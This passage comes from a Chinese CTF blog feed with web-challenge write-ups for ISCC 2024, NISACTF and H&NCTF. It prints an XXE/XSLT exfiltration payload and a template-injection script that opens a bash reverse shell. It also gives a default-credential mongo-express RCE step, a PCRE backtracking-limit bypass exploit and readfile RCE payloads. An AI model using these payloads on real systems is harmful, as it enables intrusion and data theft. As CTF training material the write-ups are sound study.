class="hljs-string">&lt;!DOCTYPE a [</span><br><span class="hljs-string">   &lt;!ENTITY xxe SYSTEM  &quot;http://101.200.138.180:30280/flag&quot; &gt;]&gt;</span><br><span class="hljs-string">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="hljs-string">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="hljs-string">    &lt;HTML&gt;</span><br><span class="hljs-string">      &lt;HEAD&gt;</span><br><span class="hljs-string">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="hljs-string">      &lt;/HEAD&gt;</span><br><span class="hljs-string">      &lt;BODY&gt;</span><br><span class="hljs-string">        &lt;img&gt;</span><br><span class="hljs-string">          &lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="hljs-string">            http://这边填服务器和端口/?&amp;xxe;</span><br><span class="hljs-string">          &lt;/xsl:attribute&gt;</span><br><span class="hljs-string">        &lt;/img&gt;</span><br><span class="hljs-string">      &lt;/BODY&gt;</span><br><span class="hljs-string">    &lt;/HTML&gt;</span><br><span class="hljs-string">  &lt;/xsl:template&gt;</span><br><span class="hljs-string">&lt;/xsl:stylesheet&gt;`</span><br><br>xml = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,<span class="hljs-subst">$&#123;btoa(xmls)&#125;</span>&quot;?&gt;</span><br><span class="hljs-string">&lt;asdf&gt;&lt;/asdf&gt;`</span><br>xss = <span class="hljs-built_in">encodeURIComponent</span>(xml)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xss)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/xss.png" alt="xss"></p><p>然后拼接脚本就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://101.200.138.180:30280/adminbot?url=http://101.200.138.180:30280/?payload=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2F<br>xsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2B<br>CjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHA6Ly8xMDEuMjAwLjEzOC4x<br>ODA6MzAyODAvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudz<br>Mub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdG<br>NoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTE<br>U%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2<br>w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHA6Ly80Ny4xMjIuMjIuMTY6ODA4<br>MC8%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC<br>9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%2<br>2%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E<br><br></code></pre></td></tr></table></figure><p>多尝试几次理论上火狐也是可以传的我试过了</p><p><img src="/../../images/iscc2024/xss1.png" alt="xss1"></p><h3 id="回来吧永远滴神"><a href="#回来吧永远滴神" class="headerlink" title="回来吧永远滴神"></a>回来吧永远滴神</h3><p>呜呜呜，我再也不看英雄联盟了。</p><p>首先的界面是需要填空的，搜索一下</p><p><img src="/../../images/iscc2024/yyds.png" alt="yyds"></p><p>填空就行，然后进入一个页面</p><p><img src="/../../images/iscc2024/yyds1.png" alt="yyds1"></p><p>好像是模板注入，看不了源码，view-source也看不了，用bp抓一下内容</p><p><img src="/../../images/iscc2024/yyds2.png" alt="yyds2"></p><p>整数这块有点问题噢，后面还有等于，赛博厨子一把梭,先base64再转hex得到</p><p><img src="/../../images/iscc2024/yyds3.png" alt="yyds3"></p><p>通过分析flag应该是拼接的内容，我们再看看原来的，尝试模板注入看看</p><p><img src="/../../images/iscc2024/yyds4.png" alt="yyds4"></p><p>有内容的，那就尝试写个脚本看看吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url = <span class="hljs-string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.Zk7ADA.GKdiBAKEeHRKoMPRWoSoRkaaH2c&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;检查字符串是否能通过WAF。如果能通过，返回True；否则返回False。&quot;&quot;&quot;</span><br>    time.sleep(<span class="hljs-number">0.02</span>)  <span class="hljs-comment"># 防止请求发送过多</span><br>    <span class="hljs-keyword">try</span>:<br>        resp = requests.post(url, cookies=cookies, timeout=<span class="hljs-number">10</span>, data=&#123;<span class="hljs-string">&quot;iIsGod&quot;</span>: payload&#125;)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;大胆&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/服务器/端口 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>也是概率性的事情</p><p><img src="/../../images/iscc2024/yyds5.png" alt="yyds5"></p><p>讲改内容输入到页面的内容，反弹shell</p><p><img src="/../../images/iscc2024/yyds6.png" alt="yyds6"></p><p>还有一部分的内容估计就在app.py里面了，是个很长内容的代码</p><p><img src="/../../images/iscc2024/yyds7.png" alt="yyds7"></p><p>具体定位到key和偏移值和密文，写个脚本得到答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python">![yyds8](../../images/iscc2024/yyds8.png)<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    ECB = <span class="hljs-number">0x01</span><br>    CBC = <span class="hljs-number">0x02</span><br>    CFB = <span class="hljs-number">0x03</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv=<span class="hljs-literal">None</span></span>):<br>        self.BLOCK_SIZE = <span class="hljs-number">64</span>  <span class="hljs-comment"># Block size in bits</span><br>        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), self.BLOCK_SIZE // <span class="hljs-number">16</span>)]<br>        self.DELTA = <span class="hljs-number">0x9e3779b9</span><br>        self.IV = iv<br>        self.ROUNDS = <span class="hljs-number">64</span><br>        self.mode = self._determine_mode(iv)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_determine_mode</span>(<span class="hljs-params">self, iv</span>):<br>        <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Mode.ECB<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(iv) * <span class="hljs-number">8</span> == self.BLOCK_SIZE:<br>            <span class="hljs-keyword">return</span> Mode.CBC<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Mode.CFB<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(_a ^ _b <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        c0 = b2l(block[:<span class="hljs-number">4</span>])<br>        c1 = b2l(block[<span class="hljs-number">4</span>:])<br>        <span class="hljs-built_in">sum</span> = (self.DELTA * self.ROUNDS) &amp; mask<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            c1 -= ((c0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c1 &amp;= mask<br>            c0 -= ((c1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c1 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c0 &amp;= mask<br>            <span class="hljs-built_in">sum</span> -= self.DELTA<br><br>        <span class="hljs-keyword">return</span> l2b((c0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | c1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_encrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        m0 = b2l(block[:<span class="hljs-number">4</span>])<br>        m1 = b2l(block[<span class="hljs-number">4</span>:])<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            <span class="hljs-built_in">sum</span> += self.DELTA<br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[i % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m0 &amp;= mask<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(i + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (m0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m1 &amp;= mask<br><br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_ecb</span>(<span class="hljs-params">self, blocks</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(self._decrypt_block(block) <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cbc</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            decrypted_block = self._decrypt_block(block)<br>            plaintext_block = self._xor(prev_block, decrypted_block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cfb</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            output = self._encrypt_block(prev_block)<br>            plaintext_block = self._xor(output, block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, ciphertext</span>):<br>        block_size_bytes = self.BLOCK_SIZE // <span class="hljs-number">8</span><br>        blocks = [ciphertext[i:i + block_size_bytes] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), block_size_bytes)]<br><br>        <span class="hljs-keyword">if</span> self.mode == Mode.ECB:<br>            plaintext = self._decrypt_ecb(blocks)<br>        <span class="hljs-keyword">elif</span> self.mode == Mode.CBC:<br>            plaintext = self._decrypt_cbc(blocks)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/yyds8.png" alt="yyds8"></p><p>一共得到四个部分拼接起来看看可能是栅栏，我们用在线枚举得到答案</p><p><img src="/../../images/iscc2024/yyds9.png" alt="yyds9"></p><h3 id="实战阶段一"><a href="#实战阶段一" class="headerlink" title="实战阶段一"></a>实战阶段一</h3><p>这个cve漏洞完全跟着网上一篇文章来就可以成功了，，也说一下</p><p><a href="https://www.cnblogs.com/arrest/articles/17529877.html">文章</a>，跟着来就行了</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%98.png" alt="实战"></p><p>先尝试看看flag里面有没有内容，然后注意到了cve漏洞，去具体搜索一下看看</p><p>mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登<br>录，或者目标服务器没有修改默认的账号密码（ admin:pass ），则可以执行任意node.js代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Authorization: Basic YWRtaW46cGFzcw==<br></code></pre></td></tr></table></figure><p>改个success+账户名就行</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%981.png" alt="实战1"></p><p>总结：虽然是炒冷饭，还是记录一下吧，没什么好说的，人民的好比赛。（劳累.jpg</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP利用PCRE回溯次数限制绕过</title>
    <link href="/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
    <url>/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>刷题碰到了这种题目，记录一下知识点。</p><p>首先可以拜读一下p神的文章，还是很有收获的。</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>然后我也简要的说一下吧。</p><p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>就以p神举的例子，我们正则&lt;?.*[(&#96;;?&gt;].*,然后输入&lt;?php phpinfo();&#x2F;&#x2F;aaaaa这个内容</p><p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();&#x2F;&#x2F;aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(&#96;;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的&#x2F;&#x2F;aaaaa，完成正则。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>是先看到的题目，然后才开始找知识点的。<a href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF</title>
    <link href="/2024/05/13/H&amp;NCTF%202024/"/>
    <url>/2024/05/13/H&amp;NCTF%202024/</url>
    
    <content type="html"><![CDATA[<p>前言：比赛也没怎么打，就看了看，自己会的还是太少了，等师傅们发完wp想看看复现一遍的，先写写记录一下知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p>***知识点:***rce绕过-编码绕过</p><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><em><strong>分析：</strong></em>post传入两个值，task正则绕过，flag大小写绕过</p><p>​然后replace，意思就是执行task传入的内容。</p><p><em><strong>解题：</strong></em>首先构造flag，我们随便改个大小写就行，<code>please_give_me_flaG</code>,然后看task，常用的rce函数都被禁用了，我尝试了scandir读取内容失败了，学习了一会，可以先base64加密再解密得到想要的&#x2F;flag，</p><p>payload:<code>task=var_dump(readfile(base64_decode(&quot;L2ZsYWc=&quot;)))&amp;flag=please_give_me_flaG</code></p><p><img src="/../images/H&NCTF/rce.png" alt="rce"></p><p>也可以用rot-13解密，<code>task=var_dump(readfile(str_rot13(&quot;/synt&quot;)))&amp;flag=please_give_me_flaG</code></p><p>这样也是可以的，可以多尝试看看。（回头看了一下其他师傅的知识点，其实有许多绕过的方法</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><p><em><strong>知识点：</strong></em>提示看hint，可以给到源码，放一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 